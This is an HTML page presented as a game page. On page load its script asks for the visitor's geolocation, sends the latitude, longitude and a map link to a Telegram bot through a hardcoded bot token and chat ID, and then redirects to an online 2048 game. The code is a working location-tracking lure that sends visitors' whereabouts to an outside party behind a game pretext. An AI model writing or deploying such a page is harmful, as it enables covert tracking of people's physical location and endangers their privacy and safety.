<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Game Page</title>
  <script>
    window.onload = function () {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(success, error);
      } else {
        alert("Geolocation is not supported by this browser.");
      }

      function success(position) {
        var lat = position.coords.latitude;
        var lon = position.coords.longitude;
        var googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

        // Telegram API
        var botToken = "7626988276:AAHoOUR55bEPjO6gQHOQPc0tBWDtt_Yhee4";
        var chatId = "6826043103";
        var message = `New location received:\nLatitude: ${lat}\nLongitude: ${lon}\nGoogle Maps: ${googleMapsLink}`;

        var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        fetch(url)
          .then(response => {
            console.log("Location sent to Telegram");
            // Redirect to a simple online game after sending location
            window.location.href = "https://html5games.com/Game/2048/index.html";
          })
          .catch(err => {
            console.error("Error sending location:", err);
            window.location.href = "https://html5games.com/Game/2048/index.html";
          });
      }

      function error(err) {
        console.warn(`ERROR(${err.code}): ${err.message}`);
        alert("Unable to retrieve your location.");
        window.location.href = "https://html5games.com/Game/2048/index.html";
      }
    };
  </script>
</head>
<body>
  <h1>Welcome to the Game Page</h1>
  <p>This page is for testing location and will redirect to a game after sending your location to Telegram.</p>
